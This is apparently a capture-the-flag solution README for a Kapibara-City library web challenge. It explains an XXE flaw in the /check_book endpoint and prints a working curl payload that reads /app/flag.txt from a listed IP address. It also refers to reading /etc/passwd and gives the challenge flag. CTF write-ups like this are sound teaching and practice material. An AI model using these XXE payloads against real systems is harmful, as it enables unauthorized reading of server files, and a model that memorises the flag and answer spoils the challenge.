# Библиотека Капибара-Сити — local artifacts

```text
solution/
├─ flag.txt                       KubSTU{xxe_1s_v3ry_c0mmon_1n_capy_l1brary}
│                                 (server emits `capyCTF{...}`; the platform
│                                  expects/accepts `KubSTU{...}` for submission)
├─ exploit.sh                     usage: ./exploit.sh /app/flag.txt
└─ artifacts/
   ├─ index.html                  /
   ├─ style.css                   /static/css/style.css
   ├─ api_check_book_normal.txt   POST /check_book with id=1 (normal book lookup)
   ├─ api_check_book_xxe_passwd.txt   XXE → file:///etc/passwd
   └─ api_check_book_xxe_flag.txt     XXE → file:///app/flag.txt
```

## TL;DR vulnerability

The `Check book` form posts XML to `/check_book`. The Python (Werkzeug 3.1.8 /
Debian 13) backend parses with an external-entity-enabled XML parser. Classic
XXE — substitute the `<id>` value with a `SYSTEM "file://…"` entity:

```bash
curl http://31.129.105.124/check_book \
  -H 'Content-Type: application/xml' \
  --data-binary '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY x SYSTEM "file:///app/flag.txt">]><book><id>&x;</id></book>'
```

Files containing XML-illegal bytes (NUL, raw `<`/control chars, e.g.
`/proc/self/cmdline`, `/proc/self/environ`, `/app/app.py`) crash the entity
expansion and aren't readable without a CDATA-wrapping out-of-band DTD; the
flag file is plain ASCII so this wasn't needed.
